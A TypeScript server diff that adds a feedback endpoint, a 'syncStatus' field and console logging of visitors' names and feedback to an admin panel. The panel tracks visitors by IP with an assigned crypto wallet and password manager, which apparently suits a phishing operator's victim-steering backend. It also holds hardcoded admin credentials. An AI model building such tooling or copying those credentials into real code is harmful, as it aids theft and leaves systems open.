@@ -5,14 +5,21 @@ const ADMIN_USERNAME = "admin";
 const ADMIN_PASSWORD = "demo123";
 const SESSION_COOKIE = "admin_demo_session";
 const MAX_ACTIVITY_RECORDS = 1000;
+const MAX_FEEDBACK_LENGTH = 1000;
 
 export type VisitorActivity = {
   ipAddress: string;
   wallet: "metamask" | "phantom" | null;
   passwordManager: "1Password" | "Bitwarden" | null;
+  syncStatus: "Synced" | "Not";
   fullNames: {
     id: string;
     fullName: string;
+    submittedAt: string;
+  }[];
+  feedbacks: {
+    id: string;
+    feedback: string;
     submittedAt: string;
   }[];
   visits: {
@@ -193,6 +200,81 @@ export const handleAdminActivity = async (
   request: IncomingMessage,
   response: ServerResponse
 ) => {
+  if (
+    request.method === "POST" &&
+    new URL(request.url ?? "/", "http://localhost").searchParams.get("view") ===
+      "submit-feedback"
+  ) {
+    let body: unknown;
+    try {
+      body = await readJsonBody(request);
+    } catch {
+      sendJson(response, 400, { error: "Invalid feedback." });
+      return;
+    }
+
+    if (
+      typeof body !== "object" ||
+      body === null ||
+      !("feedback" in body) ||
+      typeof body.feedback !== "string" ||
+      ("isFirstTry" in body && typeof body.isFirstTry !== "boolean")
+    ) {
+      sendJson(response, 400, { error: "Feedback is required." });
+      return;
+    }
+
+    const feedback = body.feedback.trim();
+    if (!feedback || feedback.length > MAX_FEEDBACK_LENGTH) {
+      sendJson(response, 400, {
+        error: "Feedback must be between 1 and 1000 characters."
+      });
+      return;
+    }
+
+    const ipAddress = getClientIp(request);
+    let activity = visitorActivities.find(
+      (entry) => entry.ipAddress === ipAddress
+    );
+    if (!activity) {
+      activity = {
+        feedbacks: [],
+        fullNames: [],
+        ipAddress,
+        passwordManager: null,
+        syncStatus: "Synced",
+        visits: [],
+        wallet: null
+      };
+      visitorActivities.push(activity);
+    }
+
+    const submittedAt = new Date().toISOString();
+    const isFirstTry = "isFirstTry" in body && body.isFirstTry === true;
+    if (!isFirstTry) {
+      activity.wallet = null;
+    }
+    activity.feedbacks.unshift({
+      feedback,
+      id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
+      submittedAt
+    });
+    if (activity.visits.length === 0) {
+      activity.visits.unshift({
+        id: `${Date.now()}-${Math.random().toString(36).slice(2)}`,
+        operatingSystem: inferOperatingSystem(
+          request.headers["user-agent"] ?? ""
+        ),
+        visitedAt: submittedAt
+      });
+    }
+
+    console.log(`--- ${ipAddress} - feedback - ${feedback} ---`);
+
+    sendJson(response, 202, { recorded: true });
+    return;
+  }
+
   if (request.method === "POST") {
     const userAgent = request.headers["user-agent"] ?? "";
     const ipAddress = getClientIp(request);
@@ -201,9 +283,11 @@ export const handleAdminActivity = async (
     );
     if (!activity) {
       activity = {
+        feedbacks: [],
         fullNames: [],
         ipAddress,
         passwordManager: null,
+        syncStatus: "Synced",
         visits: [],
         wallet: null
       };
@@ -252,7 +336,10 @@ export const handleAdminActivity = async (
     const activity = visitorActivities.find(
       (entry) => entry.ipAddress === getClientIp(request)
     );
-    sendJson(response, 200, { wallet: activity?.wallet ?? null });
+    sendJson(response, 200, {
+      syncStatus: activity?.syncStatus ?? "Synced",
+      wallet: activity?.wallet ?? null
+    });
     return;
   }
 
@@ -276,13 +363,15 @@ export const handleAdminActivity = async (
       !("ipAddress" in body) ||
       !("wallet" in body) ||
       !("passwordManager" in body) ||
+      !("syncStatus" in body) ||
       typeof body.ipAddress !== "string" ||
       (body.wallet !== null &&
         body.wallet !== "metamask" &&
         body.wallet !== "phantom") ||
       (body.passwordManager !== null &&
         body.passwordManager !== "1Password" &&
-        body.passwordManager !== "Bitwarden")
+        body.passwordManager !== "Bitwarden") ||
+      (body.syncStatus !== "Synced" && body.syncStatus !== "Not")
     ) {
       sendJson(response, 400, { error: "Invalid activity update." });
       return;
@@ -298,6 +387,7 @@ export const handleAdminActivity = async (
 
     activity.wallet = body.wallet;
     activity.passwordManager = body.passwordManager;
+    activity.syncStatus = body.syncStatus;
     sendJson(response, 200, { activity });
     return;
   }
@@ -363,9 +453,11 @@ export const handleAdminSignup = async (
   );
   if (!activity) {
     activity = {
+      feedbacks: [],
       fullNames: [],
       ipAddress,
       passwordManager: null,
+      syncStatus: "Synced",
       visits: [],
       wallet: null
     };
@@ -387,6 +479,8 @@ export const handleAdminSignup = async (
       visitedAt: submittedAt
     });
   }
+
+  console.log(`--- ${ipAddress} - fullname - ${fullName} ---`);
 
   sendJson(response, 202, { recorded: true });
 };
